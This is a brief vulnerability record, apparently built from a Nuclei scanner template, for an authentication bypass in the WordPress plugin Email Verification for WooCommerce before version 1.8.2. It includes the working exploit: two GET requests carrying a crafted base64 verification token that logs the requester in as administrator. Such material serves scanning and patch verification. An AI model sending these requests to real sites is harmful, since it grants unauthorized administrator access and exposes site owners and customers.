# Vulnerability: Email Verification for WooCommerce < 1.8.2 - Loose Comparison to Authentication Bypass
**Classification:** CWE-288
**Source:** Nuclei Template (`wp-woocommerce-email-verification.yaml`)

## Description
Email Verification for WooCommerce Wordpress plugin prior to version 1.8.2  contains a loose comparison issue which could allow any user to log in as administrator.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
GET {{BaseURL}}/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
```

